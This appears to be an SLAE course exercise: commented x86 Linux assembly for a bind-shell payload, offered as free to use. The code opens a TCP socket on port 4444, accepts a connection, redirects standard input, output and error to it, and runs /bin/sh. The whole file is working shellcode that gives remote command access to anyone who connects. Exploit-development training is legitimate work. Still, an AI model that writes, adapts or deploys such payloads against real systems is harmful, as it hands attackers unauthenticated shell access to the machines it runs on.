 ; Student ID: SLAE - 871
 ; code is free to use


       global _start

    section .text
    _start:

        push 0x66           ; socketcall syscall
        pop eax

        push 1            ; SYS_SOCKET call argument
        pop ebx

        ; sys_socket arguments
        xor edi, edi        ; reset esi register
        push edi            ; IPPROTO_IP (0x0)
        push ebx            ; SOCK_STREAM (0x1)
        push 2              ; AF_INET (0x2)
        mov ecx, esp        ; pointer to the args

        int 0x80            ; exec sys_socket socketcall syscall

        pop edi             ; 0x2 for next syscall (SYS_BIND)

        ; switch eax and edi. edi now contains sockfd
        xor edi, eax
        xor eax, edi
        xor edi, eax

        ; Binding
         ; int socketcall(int call, unsigned long *args);
        ; int bind(int sockfd, const struct sockaddr *addr, socklen_t addrlen);

        ; SYS_BIND (0x2)
    push 0x2
    pop ebx

    ; EAX ==> al
        mov al, 0x66        ; socketcall syscall
        ; srv_addr
        pop edx             ; INADDR_ANY (0x0)
    ; was dword
        push word 0x5c11    ;  htons(portno)
        push bx             ; AF_INET (0x2)

        mov ecx, esp

       ; push 0x10           ; sizeof(srv_addr) = 16
         push dword 16
        push ecx            ; pointer to srv_addr
        push edi            ; sockfd
        mov ecx, esp

        int 0x80            ; exec SYS_BIND socketcall (eax will be 0 on true)

        ; Listen for connection
        ; int socketcall(int call, unsigned long *args);
        ; int listen(int sockfd, int backlog);

        push eax            ; backlog=0
        push edi            ; sockfd
        mov ecx, esp
    ; EAX ==> al
        mov al, 0x66        ; socketcall syscall
     
    ; multiply bl by 2 to get 4 (SYS_LISTEN)

        push 4
        pop ebx
        int 0x80            ; exec SYS_LISTEN socketcall

        ; Accept connections
        ; int socketcall(int call, unsigned long *args);
        ; int accept(int sockfd, struct sockaddr *addr, socklen_t *addrlen);

    ; ESI
        push eax            ; addrlen (0x0)
        push eax            ; addr (0x0)
        push edi            ; sockfd
        mov ecx, esp

    ; EAX ==> al
        mov al, 0x66        ; socketcall syscall
    ;    inc ebx             ; SYS_ACCEPT (0x5)
       push 0x5
       pop ebx

        int 0x80            ; exec SYS_ACCEPT socketcall
      ; store clientfd in ebx
    mov ebx, eax

        ; Redirect STD;
        ; int dup2(int oldfd, int newfd);
        pop ecx             ; removes socketfd from stack
        pop ecx             ; remove addr (0x0) from stack

    ; ECX ==> cl
    push 0x2
    pop ecx    ; set loop counter to 2

    loop:

    ; EAX ==> al
        mov al, 63        ; dup2 syscall 63 = 0x3f
        int 0x80            ; exec dup2 syscall
        dec ecx             ; decrement loop counter
        jns loop            ; loop until we go below 0

        ; Exec shell
        ; int execve(const char *filename, char *const argv[], char *const envp[]);

            xor eax, eax        ; Zero out eax
        push eax        ; Push 0 onto stack (null terminator)
        push dword 0x68732f2f    ; push “//sh”
        push dword 0x6e69622f    ; push “/bin”

        mov ebx, esp        ; Set ebx to our stack pointer
        mov ecx, eax        ; Set ecx to 0
        mov edx, eax        ; Set edx to 0
    ; EAX ==> al
        mov al, 0xb        ; Set eax to 11
        int 0x80        ; Make the syscall execve(“/bin/sh”,0,0)
